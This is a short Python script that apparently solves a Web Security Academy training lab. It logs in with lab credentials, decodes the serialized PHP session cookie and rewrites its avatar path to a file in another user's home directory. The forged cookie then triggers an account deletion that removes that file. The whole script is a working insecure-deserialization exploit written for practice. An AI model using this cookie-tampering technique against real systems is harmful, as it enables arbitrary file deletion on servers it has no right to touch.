from web_security_academy.core.logger import logger
from urllib.parse import quote, unquote
from base64 import b64encode, b64decode


def solve_lab(session):
    session.login("gregg", "rosebud", with_csrf=False)

    serial = unquote(session.cookies.get("session"))
    serial = b64decode(serial).decode()
    logger.info("Extracted the following serialized object from session cookie:")
    logger.info(serial)

    serial = serial.replace(
        's:11:"avatar_link";s:18:"users/gregg/avatar"',
        's:11:"avatar_link";s:23:"/home/carlos/morale.txt"',
    )
    logger.info("Replaced avatar_link with morale.txt from Carlos's home directory:")
    logger.info(serial)

    cookie = b64encode(serial.encode())
    session.cookies.clear_session_cookies()
    session.cookies.set("session", quote(cookie.decode()))
    logger.info("Replaced the session cookie with the modified serialized object")

    session.post_path("/my-account/delete")
    logger.info('Deleted user "gregg"')
